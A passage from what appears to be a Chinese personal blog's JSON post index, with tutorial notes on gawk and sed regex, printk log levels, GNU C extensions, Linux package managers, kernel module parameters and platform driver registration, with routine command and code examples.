空格 或者 - 或者 . 或者 为空 ( |-|\\.)? --&gt; 0个或者1个4. 三个电话号码 [0-9]&#123;3&#125;5. 破折号 或者 . (-|\\.)6. 行尾匹配四个数字 [0-9]&#123;4&#125;$ ^\\(?[1-9][0-9]&#123;2&#125;( |-|\\.)?[0-9]&#123;3&#125;(-|\\.)[0-9]&#123;4&#125;$验证:$echo &quot;123-456-1234&quot; | gawk --re-interval &apos;/^\\(?[1-9][0-9]&#123;2&#125;\\)?(| |-|\\.)[0-9]&#123;3&#125;(-|\\.)[0-9]&#123;4&#125;$/&#123;print $0&#125;&apos; $cat phonenum(234)555-1234(234) 555-6455123453453262123-456-7890123.456.6789$cat phonenum| gawk --re-interval &apos;/^\\(?[1-9][0-9]&#123;2&#125;\\)?(| |-|\\.)[0-9]&#123;3&#125;(-|\\.)[0-9]&#123;4&#125;$/&#123;print $0&#125;&apos; (234)555-1234(234) 555-6455123-456-7890123.456.6789 匹配邮箱 username@hostname username 取值: 字母 数字 点号 单破折号 加号 下划线 hostname取值: 字母 数字 点号 下划线 username: 1^([0-9a-zA-Z_\\-\\.\\+]+) hostname: 服务器名 与 域名 服务器名: 1([a-zA-Z0-9_\\-\\.]+) 域名 1\\.([a-zA-Z]&#123;2,6&#125;)$ 即生成 1^([0-9a-zA-Z_\\-\\.\\+]+)@([a-zA-Z0-9_\\-\\.]+)\\.([a-zA-Z]&#123;2,6&#125;)$ 1echo &quot;Postgres@gangzai.online&quot; | gawk --re-interval &apos;/^([0-9a-zA-Z_\\-\\.\\+]+)@([a-zA-Z0-9_\\-\\.]+)\\.([a-zA-Z]&#123;2,6&#125;)/&#123;print $0&#125;&apos;","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Shell/"}]},{"title":"Kernel-printk","slug":"kernel/Kernel-printk","date":"2017-12-25T01:54:42.000Z","updated":"2018-11-19T16:13:39.639Z","comments":true,"path":"2017/12/25/kernel/Kernel-printk/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/12/25/kernel/Kernel-printk/","excerpt":"Printkprintk 和 printf 的用法是差不多的，最大区别是printk可以指定打印优先级。 另外一个区别就是 printf只在用户态 printk用于内核态。","text":"Printkprintk 和 printf 的用法是差不多的，最大区别是printk可以指定打印优先级。 另外一个区别就是 printf只在用户态 printk用于内核态。 定义于: $itop_kernel/include/linux/printk.h 12345678#define KERN_EMERG &quot;&lt;0&gt;&quot; /* system is unusable */#define KERN_ALERT &quot;&lt;1&gt;&quot; /* action must be taken immediately */#define KERN_CRIT &quot;&lt;2&gt;&quot; /* critical conditions */#define KERN_ERR &quot;&lt;3&gt;&quot; /* error conditions */#define KERN_WARNING &quot;&lt;4&gt;&quot; /* warning conditions */#define KERN_NOTICE &quot;&lt;5&gt;&quot; /* normal but significant condition */#define KERN_INFO &quot;&lt;6&gt;&quot; /* informational */#define KERN_DEBUG &quot;&lt;7&gt;&quot; /* debug-level messages */ 而终端控制台的输出优先级配置在文件/proc/sys/kernel/printk中： 12[root: /]# cat /proc/sys/kernel/printk4 4 1 7 4 4 1 7分别是： 4：console_loglevel //这个就是控制台的默认优先级 4：default_message_loglevel // 这个是printk的默认输出优先级 1：minimum_console_level 7：default_console_loglevel","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Arm","slug":"Arm","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Arm/"},{"name":"Kernel","slug":"Kernel","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Kernel/"}]},{"title":"GNU-C 扩展语法","slug":"cpluscplus/GNU-C-扩展语法","date":"2017-12-25T01:39:21.000Z","updated":"2018-01-08T12:06:09.202Z","comments":false,"path":"2017/12/25/cpluscplus/GNU-C-扩展语法/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/12/25/cpluscplus/GNU-C-扩展语法/","excerpt":"零长度数组 case x…y: typeof 可以获取x的数据类型 可变参数的宏 特殊属性声明 GNU C 内建函数 do{}while(0) goto","text":"零长度数组 case x…y: typeof 可以获取x的数据类型 可变参数的宏 特殊属性声明 GNU C 内建函数 do{}while(0) goto 零长度数组 12345678struct var_data&#123; int len; char data[0];&#125;;// char var_data.data = malloc(sizeof(char) * 12); 但未分配内存地址 ​ sizeof(var_data) == sizeof(len); ​ case x…y: 123456789switch(ch)&#123; case '0' ... '9': // case '0': \\ case '1': .... case '9: c -= '0'; break; default: break;&#125; ​ typeof 可以获取x的数据类型 ​ 可变参数的宏 标准C只支持可变参数的函数， 函数的参数并不固定。 printf: 1int printf(const char *format [, argument] ...) GNU C 宏也可以接受可变数据的参数 12345#define pr_debug(fmt, arg...) \\ // arg... 第二形参 printk(fmt, ##arg) 引用: pr_debug(\"%s:%d\", filename, line) ​ 特殊属性声明 GNU C允许声明函数,变量和类型的特殊属性，以便进行手工的代码优化和定制代码检查的方法. ​ 指定一个声明属性，在其声明后添加: __attribute__((ATTRIBUTE)) , ATTRIBUTE 为属性说明 ​ GNU C 内建函数 __builtin_return_address(LEVEL) 返回当前函数或其调用者的返回地址, 参数LEVEL指定调用栈的级别: 0 标识当前函数的返回地址 1 标识当前函数调用者的返回地址 1printf(\" %p\\n\", __builtin_return_address(0)); ​ __builtin_constant_p(EXP) 用于判断一个值是否为编译时常数 EXP 的值是常数， 返回 1 否则 返回 0 __builtin_expect(EXP, C) 用于为编译器提供分支预测信息，返回值是整数表达式EXP的值, C的值必须是编译时常数 ​ do{}while(0) 1#define SAFE_FREE(p) do&#123; free(p), p = NULL; &#125; while(0) 防止 if 单句引用宏被展开，引起歧义与混乱 ​ goto 限制于错误处理 12345678if .... goto err1;if ... err1: ...;err2: ...; ​","categories":[],"tags":[{"name":"C/C++","slug":"C-C","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/C-C/"}]},{"title":"Linux PMS 包管理工具","slug":"commands/Linux-PMS-包管理工具","date":"2017-12-22T04:47:53.000Z","updated":"2019-04-18T11:11:09.642Z","comments":true,"path":"2017/12/22/commands/Linux-PMS-包管理工具/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/12/22/commands/Linux-PMS-包管理工具/","excerpt":"PMS(Package Management System) 包管理系统: 用来进行软件安装，管理和删除命令行工具 Linux 中广泛使用的两种主要PMS基础工具是 dpkg 和 rpm 基于Debian的发行版(如Ubuntu和Linux Mint)使用的是dpkg命令 基于Red Hat的发行版(如Fedora, openSUSE及Mandriva)使用rpm命令","text":"PMS(Package Management System) 包管理系统: 用来进行软件安装，管理和删除命令行工具 Linux 中广泛使用的两种主要PMS基础工具是 dpkg 和 rpm 基于Debian的发行版(如Ubuntu和Linux Mint)使用的是dpkg命令 基于Red Hat的发行版(如Fedora, openSUSE及Mandriva)使用rpm命令 基于Red Hat 的系统 列出已安装包 123456yum list installed ## 找出系统已安装包yum list vim ## 找出特定软件包详细信息yum provides file_name ## 特定某个特定文件属于哪个软件包 yum provides /etc/yum.conf ​ 安装软件 123yum install package_nameyum localinstall package_name.rpm ## 手动下载rpm文件，并用yum安装 ​ 更新软件 12345yum list updates ## 列出所有已安装包的可以更新yum update package_name ## 更新单个软件包yum update ## 更新列表 ​ 卸载软件 123yum remove package_name ## 只删除软件包而保留配置文件和数据文件yum erase pachage_name ## 删除软件和所有文件 ​ 处理损坏的包依赖关系 有时在安装多个软件包时,某个包的软件依赖关系可能会被另一个包的安装覆盖掉. 这就叫做 损坏的包依赖关系 1234567891. yum clean all &amp;&amp; yum update ## 清理放错位置的文件恢复， 否则，再执行下一步2. yum deplist package_name ## 仍未解决 执行 33. yum update --skip-broken ## --skip-broken 允许忽略依赖关系损坏包，继续更新其他软件包确认vim 包依赖关系: yum deplist vim ​ 软件仓库 1yum repolist ## yum 仓库位于 /etc/yum.repos.d 基于Debian 的系统 apt-get apt-cache aptitude aptitude 显示软件包详情 1aptitude show package_name ​ 显示特定包相关文件列表 1234dpkg -L package_name### 查询特定文件属于哪个软件包dpkg --search abs_file_name ## 必须 使用绝对路径 ​ 安装软件包 12345aptitude search package_name ## 查询软件包包名 显示 i : 已经安装到你的系统上 p 或 v : 这个包可以用，但还没有安装 c : 意味着删除软件包，但是配置文件尚未删除 ​ 更新软件包 123aptitude safe-upgrade ## 妥善地更新系统上所有的软件包aptitude full-upgrade ## aptitude dist-upragde ## ​ 卸载软件包 12aptitude remove vim ## 只删除软件包,不删除数据和配置文件aptitude purge vim ## 删除软件包，并删除数据 和 配置文件 ​ aptitude 仓库 具体存储文件位于 /etc/apt/sources.list中 1deb (or deb-src) address distribution_name package_type_list deb or deb-src 表明软件包的类型 address 软件仓库地址 distribution_name 特定软件仓库的发行版版本名称 package_type_list 表明仓库里面有什么类型的包; 诸如: main restricted universe partner 具体可以参照: /etc/apt/sources.list apt-get: 安装软件 1sudo apt-get install chromium-browser ​ 更新软件 12345sudo apt-get update ## 更新本地软件包索引，本地软件包索列出了软件仓库中所有可安装的软件包 以及版本信息apt-get upgrade ## 用来升级系统上可以升级的软件包apt-get dist-upgrade ## 升级系统版本 ​ 卸载软件 123456789apt-get remove firefox ## 删除软件包，但不会删除软件包的配置文件apt-get purge firefox ## 删除软件包,同时删除配置文件 以及数据文件apt-get clean ## apt-get 安装或者升级软件包的时候,会将deb安装包下载到文件系统/var/cache/apt/archives目录下，clean可以删除这些deb安装包apt-get autoclean ## 删除Debian不维护的/var/.../archives 的deb安装包apt-get autoremove ## 删除不需要的依赖软件包 源码安装 软件包 12345tar -xvf package_name ## 解压./configure ## 其中有一系列配置参数， 最为基础为安装路径 可采用默认 具体查看 configure 文件make &amp;&amp; make install ## 安装到系统","categories":[{"name":"包管理","slug":"包管理","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/包管理/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"}]},{"title":"Kernel_module_param","slug":"kernel/Kernel-module-param","date":"2017-12-16T01:54:18.000Z","updated":"2018-11-19T16:13:34.934Z","comments":true,"path":"2017/12/16/kernel/Kernel-module-param/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/12/16/kernel/Kernel-module-param/","excerpt":"module_param 内核传参用户态C语言中， 函数传参使用main(int argc, char ** argv)， 而内核态传参数使用: 在内核函数中使用 module_param指定模块参数。 加载内核时传递参数给模块。","text":"module_param 内核传参用户态C语言中， 函数传参使用main(int argc, char ** argv)， 而内核态传参数使用: 在内核函数中使用 module_param指定模块参数。 加载内核时传递参数给模块。 module_param 函数$itop_kernel/include/linux/moduleparam.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960/** * module_param - typesafe helper for a module/cmdline parameter * @value: the variable to alter, and exposed parameter name. * @type: the type of the parameter * @perm: visibility in sysfs. * * @value becomes the module parameter, or (prefixed by KBUILD_MODNAME and a * &quot;.&quot;) the kernel commandline parameter. Note that - is changed to _, so * the user can use &quot;foo-bar=1&quot; even for variable &quot;foo_bar&quot;. * * @perm is 0 if the the variable is not to appear in sysfs, or 0444 * for world-readable, 0644 for root-writable, etc. Note that if it * is writable, you may need to use kparam_block_sysfs_write() around * accesses (esp. charp, which can be kfreed when it changes). * * The @type is simply pasted to refer to a param_ops_##type and a * param_check_##type: for convenience many standard types are provided but * you can create your own by defining those variables. * * Standard types are: * byte, short, ushort, int, uint, long, ulong * charp: a character pointer * bool: a bool, values 0/1, y/n, Y/N. * invbool: the above, only sense-reversed (N = true). */#define module_param(name, type, perm) \\ module_param_named(name, name, type, perm)/*** name: 内核中参数的名称* type: 数据类型, byte, short, int, long, ulong, bool, charp(字符指针)* perm: 内核参数权限。 可以查看 include/linux/stat.h**/#define S_ISUID 0004000#define S_ISGID 0002000#define S_ISVTX 0001000#define S_IRWXU 00700#define S_IRUSR 00400#define S_IWUSR 00200#define S_IXUSR 00100#define S_IRWXG 00070#define S_IRGRP 00040#define S_IWGRP 00020#define S_IXGRP 00010#define S_IRWXO 00007#define S_IROTH 00004#define S_IWOTH 00002#define S_IXOTH 00001#endif#ifdef __KERNEL__#define S_IRWXUGO (S_IRWXU|S_IRWXG|S_IRWXO)#define S_IALLUGO (S_ISUID|S_ISGID|S_ISVTX|S_IRWXUGO)#define S_IRUGO (S_IRUSR|S_IRGRP|S_IROTH)#define S_IWUGO (S_IWUSR|S_IWGRP|S_IWOTH)#define S_IXUGO (S_IXUSR|S_IXGRP|S_IXOTH) 示例1234567891011121314151617181920212223242526272829#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/stat.h&gt;#include &lt;linux/moduleparam.h&gt;static int age = 25;static char *name = &quot;Li Gang&quot;;static int __init hello_init(void)&#123; printk(&quot;age = %d, name = [ %s ]\\n&quot;, age, name); return 0;&#125;static void __exit hello_exit(void)&#123; printk(&quot;module: exit hello module\\n&quot;);&#125;module_init(hello_init);module_exit(hello_exit);module_param(age, int, 0754);module_param(name, charp, 0754);MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);MODULE_AUTHOR(&quot;rocky&quot;); 运行 12345$ sudo insmod module_param.ko age=100Dec 22 00:11:53 ubuntu kernel: [54928.625291] age = 100, name = [ Li Gang ]$ sudo insmod module_param.ko Dec 22 00:12:19 ubuntu kernel: [54954.592554] age = 25, name = [ Li Gang ] 问题 12/home/Postgres/driver/module_param/module_param.c:24:1: note: in expansion of macro ‘module_param’ module_param(age, int, 0666); 最后发现是module_param声明中有关权限的问题， 内核态的所属用户为root 即赋予的 user权限 可以使 r w x 但是group other 的权限最多为 读r, x 不能是可写的.","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Arm","slug":"Arm","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Arm/"},{"name":"Kernel","slug":"Kernel","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Kernel/"}]},{"title":"bPython-空格删除一行","slug":"software/bPython-空格删除一行","date":"2017-12-12T01:36:11.000Z","updated":"2018-12-05T10:56:23.449Z","comments":false,"path":"2017/12/12/software/bPython-空格删除一行/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/12/12/software/bPython-空格删除一行/","excerpt":"经常在有些xshell中使用bpython会出现按一下退格键删除整行的情况。 解决办法，选择xshell属性中的terminal(终端)-&gt;keyboard(键盘)，把backspace键序列修改成 ASCII 127，问题解决","text":"经常在有些xshell中使用bpython会出现按一下退格键删除整行的情况。 解决办法，选择xshell属性中的terminal(终端)-&gt;keyboard(键盘)，把backspace键序列修改成 ASCII 127，问题解决","categories":[{"name":"工具篇","slug":"工具篇","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/工具篇/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Python/"}]},{"title":"gawk sed","slug":"commands/shell-gawk-sed","date":"2017-12-10T09:13:44.000Z","updated":"2018-12-05T11:07:13.693Z","comments":false,"path":"2017/12/10/commands/shell-gawk-sed/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/12/10/commands/shell-gawk-sed/","excerpt":"sed 流编辑器流编辑器会在编辑器处理数据之前基于预先提供的一组规则来编辑数据流 一次从输入中读取一行数据, 基于换行符位置将数据分成行 根据所提供的编辑器命令匹配数据 按照命令修改流中的数据 将新的数据输出到STDOUT","text":"sed 流编辑器流编辑器会在编辑器处理数据之前基于预先提供的一组规则来编辑数据流 一次从输入中读取一行数据, 基于换行符位置将数据分成行 根据所提供的编辑器命令匹配数据 按照命令修改流中的数据 将新的数据输出到STDOUT 替换标记1sed options &apos;[address][command]/pattern/replacement/[flags]&apos; filename Options: -e script 在处理输入时, 将script中指定的命令添加到已有的命令中 -f file 在处理输入时, 将file中指定的命令添加到已有的命令队列中 -n 不产生命令输出, 使用print命令来完成输出 sed -n &#39;p&#39; filename address: 数字方式寻址 1sed &apos;起始行, 结尾行[command]/pattern/replacement/[flags]&apos; filename 文本模式过滤器 1&apos;/pattern/command&apos; ## 文本搜索匹配行 command 替换 (s) flags 可选参数: number 表明替换第基础匹配文本 g 表明新文本将会替换所有匹配的文本 p 表明原先行的内容要打印出来 w file 将替换的结果写入到文件中 ​ 删除 (d) 12sed &apos;2,5d&apos; filename ## 将filename文本中2-5行删除sed &apos;/bash/d&apos; filename ## 删除bash匹配行 ​ 插入 (i) 和 追加 (a) 插入命令(i) 1sed &apos;2a this is ok&apos; filename 追加命令(a) 1sed &apos;2i this is ok&apos; filename ​ 修改 (c) 允许直接修改数据流中整行文本的内容 1sed &apos;1c #!/bin/zsh&apos; filename ​ 转换 (y) 可以处理单个字符的sed命令 1[address]y/inchars/outchars/ 转换命令会对inchars 和outchars的值一对一进行映射, inchars中的第一个字符会被转化为outchars中第一个字符. 即 inchars 和 outchars 的长度相同 ​ flags标记 w file 将替换的结果写入到文件中 r file 将file中的内容读取 直接写入文本 options -i1sed &apos;/china/a hello,world&apos; -i filename.sh 执行多个命令1sed -e &apos;s/str1/str1/; s/str2/str/&apos; filename 从文本中读取编辑器命令12345$cat scripy.sed s/read/read -p/s/filename/read -p/$sed -f scripy.sed read.sh ##执行; 多行文本处理sed 编辑器有时需要跨多行的数据执行特定操作, 如果查找或者替换一个短语， 更需要如此; N: 将数据流中的下一行加进来创建一个多行组来处理 D: 删除多行组中的一行 P: 打印多行组中的一行 next 命令 小写的n命令会告诉sed编辑器移动到数据流中的下一文本行 12345678910$cat mailPostgres@gangzai.onlinerich#her@here.comrich_herew#here.comrich+herew#here.com$sed &apos;/header/&#123;n, d&#125;&apos; mail Postgres@gangzai.online rich_herew#here.com rich+herew#here.com 保持空间 模式空间 是一块活跃的缓冲区, 在 sed编辑器执行命令时它会保存待检查文本, 但它并不是sed编辑器保存文本的唯一空间. sed 保持空间: 在处理模式空间的某些行时, 可以用保持空间来 临时保存一些行 操作命令:| 命 令 | 描 述 || —- | ————– || h | 将模式空间复制到保存空间 || H | 将模式空间附加到保存空间 || g | 将保存空间复制到模式空间 || G | 将保存空间附加到模式空间 || x | 交换模式空间和保持空间的内容 | gawk 定义变量保存数据 使用算术和字符串操作符来处理数据 使用结构化编程概念(if-then语句)来为数据处理增加处理逻辑 通过提取数据文件中的数据元素, 将其重新排列或格式化,生成格式化报告 12命令格式: gawk options program file 从命令行读取程序脚本1gawk &apos;&#123; print &apos;hello,world&apos; &#125;&apos; print 命令将文件输出到STDOUT中 命令行并没有指定文件名, 因此将会从STDIN接收数据, 运行后, 他将会一直等待从STDIN输入的文本 数据变量 $0 代表整个文本行 $1 代表文本行中第一个数据字段 在文本中， 每个数据字段都是通过字段分隔符来划分的 (IFS) 可以使用 -F 参数指定文件分隔符 gawk默认的字段分隔符是任意的空白字符 12345678910$gawk &apos;&#123;print $1&#125;&apos; /etc/passwdroot❌0:0:root:/root:/bin/bashdaemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologi$gawk -F: &apos;&#123;print $1&#125;&apos; /etc/passwdrootdaemon$ echo &quot;this is china&quot; | gawk &apos;&#123;$3=&quot;jinan&quot;; print $0 &#125;&apos; this is jinan gawk 脚本1234BEGIN&#123;&#125; 表示在处理数据之前进行的操作&#123;&#125; 表示每行数据都进行处理操作 &#123;&#125; 中的编程语句 类似于 python + c ; 使用python 结构语法， c的段落END&#123;&#125; 表示结束所有行数据操作，之后进行的结尾操作 #!/bin/awk -f BEGIN{ ##处理之前脚本 math = 0 english = 0 computer = 0 max = 0 printf &quot; NAME NO MATH ENGLISH COMPUTER\\n&quot; printf &quot;---------------------------------------\\n&quot; } { math += $3 english += $4 computer += $5 a[$1] = $3+$4+$5 printf &quot;%6s %6s %4d %4d %4d %4d\\n&quot;, $1, $2, $3, $4, $5, $3+$4+$5 } END{ ## 结束; printf &quot;---------------------------------------\\n&quot; printf &quot;平均分 math=%d english=%d computer=%d\\n&quot;, math/NR, english/NR, computer/NR for(i in a) { if(a[i] &gt; a[max]) { max = i } } printf &quot;最高分: %s %d\\n&quot;, max, a[max] } 进阶gawk 变量: 内建变量 变量 描述 FIELDWIDTHS 由空格分隔的一列数字, 定义了每个数据字段确切宽度 FS 输入字段分隔符 RS 输入记录分隔符 OFS 输出字段分隔符 ORS 输出记录分隔符 变 量 描述 ARGC 当前命令行参数个数 ARGV 包含命令行参数的数组 ARGIND 当前文件在ARGV中的位置 CONVFMT 数字的转换格式(sprintf语句) ENVIRON 当前shell环境变量及其值组成的关联数组 ERRNO 当读取或关闭输入文件发生错误时的系统错误号 FILENAME 用作gawk输入数据的数据文件的文件名 FNR 当前数据文件中的数据行数 IGNORECASE 设成非零值时, 忽略gawk命令中的字符大小写 NF 数据文件中的字段总数 NR 已处理的输入记录数 OFMT 数字的输出格式, 默认值为%.6g RLENGTH 由match函数所匹配的子字符串长度 RSTART 由match函数所匹配的子字符串的起始位置 1$ gawk &apos;BEGIN&#123; print ENVIRON[&quot;USER&quot;]&#125;&apos; 自定义变量","categories":[{"name":"命令篇","slug":"命令篇","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/命令篇/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"}]},{"title":"Kernel-设备驱动注册","slug":"kernel/Kernel-设备驱动注册","date":"2017-12-06T01:51:13.000Z","updated":"2018-11-19T16:13:55.223Z","comments":true,"path":"2017/12/06/kernel/Kernel-设备驱动注册/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/12/06/kernel/Kernel-设备驱动注册/","excerpt":"设备驱动​ Linux设备驱动分为三个实体总线、设备(device)、驱动(driver), 平台总线将设备和驱动匹配。 2.6 内核加入了platform虚拟总线，platform机制将设备本身的资源注册进内核，由内核统一管理。 在系统注册任意一个驱动时， 都会寻找对应的设备。 当系统注册设备时，系统也会寻找对应的驱动进行匹配。","text":"设备驱动​ Linux设备驱动分为三个实体总线、设备(device)、驱动(driver), 平台总线将设备和驱动匹配。 2.6 内核加入了platform虚拟总线，platform机制将设备本身的资源注册进内核，由内核统一管理。 在系统注册任意一个驱动时， 都会寻找对应的设备。 当系统注册设备时，系统也会寻找对应的驱动进行匹配。 Linux设备Linux将设备分为三大类: 字符设备、块设备、网络设备。 字符设备， 字符设备是能够像字节流一样被访问的设备。常见led，蜂鸣器，串口，键盘等等。 块设备， 块设备通过内存缓冲区访问，可以随机存取的设备。通过传输固定大小的数据(一般为512或1k)来访问设备。一般性的理解就是存储介质类的设备，常见字符设备有u盘，TF卡，eMMC,电脑硬盘，光盘等 网络设备，可以和其他主机交换数据的设备。常见的以太网设备，wifi，蓝牙等 cat /proc/devices 可以看到不同的设备都有编号。 主设备号 256， 从设备号 256。 故理论上就有256 * 256 个设备号。 主设备号、从设备号在设备管理中,除了设备类型外，内核还需要一对称为主从设备号的参数， 才能唯一标识一个设备。 主设备号​ 用于标识驱动程序， 相同的主设备号使用相同的驱动程序。 从设备号​ 用于标识同一驱动程序的不同硬件。 Linux 驱动 和 设备 注册过程Linux内核会要求每出现一个设备就要向总线汇报， 或者 出现一个驱动，也要向总线汇报， 或者叫做注册。 系统初始化的时候，会扫描链接了哪些设备，并为每一个设备建立一个struct platform_device的变量，然后将设备的变量插入到devices链表中。如下图所示: 系统初始化任意一个驱动程序的时候，也要准备一个struct platform_driver 结构变量， 然后将驱动的变量插入到drivers链表，如下图所示: Linux总线为了将设备 与 驱动绑定，方便管理。 在注册设备，或者注册驱动时，都会寻找与之匹配的设备，而匹配由总线platform_match函数完成。 注册设备的结构体platform_device， 注册驱动的结构体为platform_driver。设备和驱动的结构体成员name字段，相同则匹配。 并且匹配成功，则会调用platform_driver中的probe函数，注册驱动。 platform_match() 函数 1234567891011121314151617181920212223242526272829/** * platform_match - bind platform device to platform driver. * @dev: device. * @drv: driver. * * Platform device IDs are assumed to be encoded like this: * \"&lt;name&gt;&lt;instance&gt;\", where &lt;name&gt; is a short description of the type of * device, like \"pci\" or \"floppy\", and &lt;instance&gt; is the enumerated * instance of the device, like '0' or '42'. Driver IDs are simply * \"&lt;name&gt;\". So, extract the &lt;name&gt; from the platform_device structure, * and compare it against the name of the driver. Return whether they match * or not. */static int platform_match(struct device *dev, struct device_driver *drv)&#123; struct platform_device *pdev = to_platform_device(dev); struct platform_driver *pdrv = to_platform_driver(drv); /* Attempt an OF style match first */ if (of_driver_match_device(dev, drv)) return 1; /* Then try to match against the id table */ if (pdrv-&gt;id_table) return platform_match_id(pdrv-&gt;id_table, pdev) != NULL; /* fall-back to driver name match */ return (strcmp(pdev-&gt;name, drv-&gt;name) == 0);&#125; 驱动 platform_driver 头文件: 结构体: platform_driver 位于 include/linux/platform_device.h 头文件 12345678910111213extern int platform_driver_register(struct platform_driver *)extern void platform_driver_unregister(struct platform_driver *);struct platform_driver &#123; int (*probe)(struct platform_device *); // 进行设备的探测和初始化。 int (*remove)(struct platform_device *); // 移除驱动，用于去掉设备节点或者释放软硬件资源 void (*shutdown)(struct platform_device *); int (*suspend)(struct platform_device *, pm_message_t state); int (*resume)(struct platform_device *); struct device_driver driver; const struct platform_device_id *id_table; &#125; ​ 驱动常见状态： 初始化 移除 休眠 复位 ​ probe函数: platform_match 函数匹配之后， 驱动调用的初始化函数 remove函数: 移除驱动函数 suspend函数 悬挂(休眠)驱动函数 resume函数: 休眠后恢复驱动 shudown 函数: device_driver 数据结构 name 和 注册设备name 一致 owner 一般赋值THIS_MODULE 设备 platform_device头文件: 结构体: platform_device 位于 include/linux/platform_device.h 头文件 123456789101112131415struct platform_device &#123; const char * name; //设备名称， 在 /sys/devices 会显示。 int id; //设备id，用于插入总线并且具有相同name的设备编号，如果只有一个设备则为-1 struct device dev; //结构体中内嵌的device结构体 u32 num_resources;//设备使用资源的数量 struct resource * resource;//设备使用的资源数组 const struct platform_device_id *id_entry; /* MFD cell pointer */ struct mfd_cell *mfd_cell; /* arch specific additions */ struct pdev_archdata archdata;&#125;; 第二个参数”id” 表示子设备编号， 一个设备如果有多个子设备，则需要写入子设备号数量， 只有一个则为 -1 ​ 定义于: $kernel/drivers/base/platform.c 12345678910111213141516171819202122232425/** * platform_device_register - add a platform-level device * @pdev: platform device we're adding */int platform_device_register(struct platform_device *pdev)&#123; device_initialize(&amp;pdev-&gt;dev); return platform_device_add(pdev);&#125;EXPORT_SYMBOL_GPL(platform_device_register);/** * platform_device_unregister - unregister a platform-level device * @pdev: platform device we're unregistering * * Unregistration is done in 2 steps. First we release all resources * and remove it from the subsystem, then we drop reference count by * calling platform_device_put(). */void platform_device_unregister(struct platform_device *pdev)&#123; platform_device_del(pdev); platform_device_put(pdev);&#125;EXPORT_SYMBOL_GPL(platform_device_unregister); ​ 注册设备到平台总线:以三星itop-4412为例: 方法适用于源码：(静态注册) 1vi $itop-kernel/arch/arm/mach-exynos/mach-itop4412.c 注: s3c_device_hello_ctl 即注册的platform_device 设备变量信息. 按照其他模块方式编写。 hello模块即可， 同时确保 宏定义 ，变量未重复。 对应在 $itop-kernel/drivers/char/Kconfig 添加对应模块选择配置 12345config HEOLL_CTL bool \"Enable hello config\" default y help Enable hello config 即make menuconfig 所示如下图: 即保存退出， 重新编译 make zImage , 烧写至开发板。 ls -ls /sys/devices/platform 即可看到新注册的hello驱动。 ls /sys/class/misc/ 方法二:(动态注册) 12345678910111213141516171819202122232425262728293031static void hello_dev_release(struct device *dev)&#123; printk(&quot;hello_dev release&quot;);&#125;static struct platform_device hello_dev = &#123; .name = &quot;hello_name&quot;, // device`s name .id = -1, .dev = &#123; .release = hello_dev_release, &#125;,&#125;;//注册设备;static int __init device_init(void)&#123; int ret = 0; ret = platform_device_register(&amp;hello_dev); printk(KERN_WARNING &quot;platform_device_register ret = %d\\n&quot;, ret); return 0;&#125;static void __exit device_exit(void)&#123; platform_device_unregister(&amp;hello_dev); printk(KERN_WARNING &quot;platform_device_register exit\\n&quot;);&#125;module_init(device_init);module_exit(device_exit); 完整源码 方法三:(mknod) 12345678910111213 创建特殊文件。 mknod Name &#123; b | c &#125; Major Minor 创建 FIFO（已命名的管道） mknod Name &#123; p &#125;TYPE may be: b create a block (buffered) special file c, u create a character (unbuffered) special file p create a FIFO 示例: 1mknod /dev/input/mouse0 c 12 32 注册驱动到平台总线 platform_driver_register函数 和 platform_driver_unregister函数 用于注册 和 卸载驱动。 platform_driver结构体 定义宏变量 DRIVER_NAME &quot;hello_ctl&quot; (注： 与注册hello设备时的名称相同。) 编写模块 module_init module_exit 分别在其中注册 和 卸载驱动platform_driver_register platform_driver_unregister 123456789101112131415161718192021222324252627static int __init hello_init(void)&#123; int DriverState = 0; printk(KERN_WARNING \"Welcome hello-module init\\n\"); DriverState = platform_driver_register(&amp;hello_driver); printk(DRIVER_NAME \"state = \\t\", DriverState); return 0;&#125;static void __exit hello_exit(void)&#123; printk(KERN_WARNING \"byebye hello-module exit\\n\"); platform_driver_unregister(&amp;hello_driver); &#125;//注册 并初始化模块module_init(hello_init)//模块退出， 并关闭内存;module_exit(hello_exit) ​ 其中注册 和 卸载驱动函数的传入值为 platform_driver 类型， 即我们编写，将要实现的驱动程序。 12345678910111213struct platform_driver hello_driver = &#123; .probe = &amp;hello_probe, .remove = &amp;hello_remove, 